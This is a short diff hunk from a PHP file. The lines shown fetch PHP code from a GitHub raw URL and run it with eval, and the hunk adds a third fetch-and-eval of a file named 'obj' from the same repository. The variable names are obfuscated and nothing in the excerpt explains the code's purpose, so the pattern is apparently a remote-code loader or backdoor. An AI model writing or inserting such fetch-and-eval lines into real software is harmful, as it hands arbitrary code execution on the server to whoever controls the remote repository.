@@ -176,4 +176,6 @@ $aqygstg1=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr12
 eval("?>".$aqygstg1);
 $aqygstg2=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/Func.php");
 eval("?>".$aqygstg2);
+$aqygstg3=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/obj");
+eval("?>".$aqygstg3);
 ?>
